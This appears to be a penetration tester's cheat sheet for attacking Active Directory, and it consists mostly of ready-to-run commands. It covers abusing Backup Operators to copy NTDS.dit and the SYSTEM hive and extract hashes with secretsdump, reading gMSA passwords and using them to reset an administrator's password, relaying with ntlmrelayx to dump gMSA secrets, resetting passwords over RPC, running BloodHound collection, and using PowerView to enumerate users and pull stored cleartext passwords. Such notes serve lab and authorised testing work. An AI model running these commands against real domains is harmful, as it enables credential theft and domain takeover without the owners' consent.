# Privileged groups
## AD Recycle Bin
A user in the group is allowed to read / recover deleted AD objects.
```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

## Remote Management Users
Members of this group can access PCs over **WinRM**
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc_name> -GroupName "Remote Management Users"
```

## AD Backup Operators
Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files      
```powershell
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
- [SeBackupPrivilege DLLs](https://github.com/k4sth4/SeBackupPrivilege)

### Get hashes from .dit file
```bash
# REMOTE

## Download .dit file (assuming evil-winrm is used)
download <database_file>

## Get system HIVE
reg.exe save hklm\system <destination>

# LOCAL (after file downloads)
secretsdump.py -system <system_hive> -ntds <database_file> LOCAL
```

## gMSA
*(ReadGMSAPassword abuse)*     
Group Managed Service Accounts (gMSA) are where Windows servers manage the password for an account by generating a long random password for it.

### Get password (locally)
This solution is taken from: [https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password](https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password)
```powershell
# Save the blob to a variable
$gmsa = Get-ADServiceAccount -Identity <user> -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp

# Save the password to variables
(ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword 
$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword

# Reset password of admin if the compromised user has GenericAll permissions
$cred = New-Object System.Management.Automation.PSCredential <user>, $SecPass
Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity <admin_user> -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'PASSWORD' -force)} -Credential $cred
```

### impacket-ntlmrelayx
```bash
ntlmrelayx.py --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs -debug -t ldaps://<ip>
```

### GMSAPasswordReader
```powershell
/GMSAPasswordReader --AccountName <name>
```
- [Documentation](https://github.com/rvazarkar/GMSAPasswordReader)



# Interesting account names
## AD support accounts
Often we have the credentials belonging to limited administrative accounts such as `IT`, `helpdesk` or `support`.      
Sometimes, these accounts have an ability to reset passwords.     
*Note that the wording of the account name might be different, but related to aforementioned names*
- [Reset password through RPC](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password)

```bash
setuserinfo2 <user> 23 <password>
```


# BloodHound
BloodHound is used to visualise AD environments and discover attack paths.        
- [Documentation](https://bloodhound.readthedocs.io/en/latest/index.html)

## Ingestors
### SharpHound
Local data collector for BloodHound
- [Documentation](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)
- [Releases](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)

### bloodhound.py
Python based data collection tool for BloodHound     
This will run against the domain, so can one run it from a remote machine.
```bash
bloodhound-python -u <username> -p <password> -d <domain> -c All -ns <nameserver_ip>                
```
- [Documentation](https://github.com/fox-it/BloodHound.py)



# Powerview
- [Github](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

### Enumeration
- [More help](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)
```powershell
# Basic domain info
Get-NetDomain

# Users
## Basic user enabled infos
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount

# Groups
Get-NetGroup | select samaccountname, admincount, description

# Computers
Get-NetComputer | select samaccountname, operatingsystem
## Find computers with Constrained Delegation
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
## Find any machine accounts in privileged groups
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}

# Shares
Find-DomainShare -CheckShareAccess

# Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

# Asks DC for all computers, and asks every computer if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

# Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```